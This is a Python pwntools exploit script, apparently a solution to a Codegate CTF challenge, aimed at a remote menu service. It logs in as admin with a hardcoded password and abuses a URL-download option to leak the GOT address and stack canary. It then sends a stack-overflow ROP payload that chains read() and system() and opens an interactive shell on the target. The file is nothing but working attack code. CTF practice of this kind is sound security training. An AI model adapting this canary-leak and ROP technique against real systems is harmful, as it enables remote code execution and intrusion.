#!/usr/bin/env python
from pwn import *
context.update(arch='i386', os='linux')
p, u = pack, unpack

conn = remote('ch41l3ng3s.codegate.kr', 2121)

conn.recvuntil('Choice:\n')

def join(name, age, user_id, pw):
    conn.send(p(1))
    conn.recvuntil('Name:\n')
    conn.sendline(name)
    conn.recvuntil('Age:\n')
    conn.sendline(str(age))
    conn.recvuntil('ID:\n')
    conn.sendline(user_id)
    conn.recvuntil('PW:\n')
    conn.sendline(pw)
    conn.recvuntil('Choice:\n')

def login(user_id, pw, read_menu=True):
    conn.send(p(3))
    conn.recvuntil('id:\n')
    conn.sendline(user_id)
    conn.recvuntil('pw:\n')
    conn.sendline(pw)
    if read_menu:
        conn.recvuntil('Choice:\n')

def download_file_admin(url):
    conn.send(p(8))
    conn.send(p(1))
    conn.recvuntil('URL:\n')
    conn.sendline(url)
    data = conn.recvline()
    conn.recvuntil('Choice:\n')
    return data


join('name', 1, 'id', 'pw')
login('admin', 'P3ssw0rd')
download_file_admin('A' * 99)
data = download_file_admin('/../')
print data.encode('hex')

assert len(data) >= 8
got_addr = u(data[:4][::-1])
binary_base = got_addr - 0x8ef8
stack_canary = u((data[4:7] + '\0')[::-1])

print 'binary_base =', hex(binary_base)
print 'stack_canary =', hex(stack_canary)
assert (stack_canary >> 24) != 0xff
assert (stack_canary >> 8) & 0xff == 0x2f
raw_input()

system = binary_base + 0x12a8
read = binary_base + 0x12c0
bss = binary_base + 0x9800
pop3ret = binary_base + 0x5709

payload = ''
payload += 'A' * 100
payload += p(stack_canary)
payload += p(got_addr)
payload += 'B' * 8
payload += p(read)
payload += p(system)
payload += p(0)
payload += p(bss)
payload += p(4)

login('aaaa', payload, read_menu=False)
raw_input()
conn.send('sh\0\0')

conn.interactive(prompt='')

